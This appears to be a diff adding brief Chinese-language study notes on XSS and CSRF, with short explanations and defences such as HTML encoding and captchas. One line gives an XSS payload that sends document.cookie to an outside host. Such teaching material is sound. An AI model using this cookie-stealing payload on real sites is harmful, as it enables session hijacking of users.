@@ -1,0 +1,17 @@
+# xss攻击（跨站脚本）
+用户浏览网页时，执行了一段恶意脚本代码
+所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞
+sample：新浪微博xss
+输入一段脚本<script>window.open(“www.b.com?param=”+document.cookie)</script>
+解决办法：用Html encode 对标签进行转义
+
+# CSRF：跨站请求伪造
+1.如果论坛以GET请求的方式来发帖http://www.b.com?content=帖子内容
+2.论坛中有帖子含有链接,url是发帖的url
+3.用户点击后，会自动发帖
+
+发帖的例子。
+
+解决办法：
+1.GET 请求应该只浏览而不改变服务器端资源。
+2.验证码（确保是用户的主动提交）
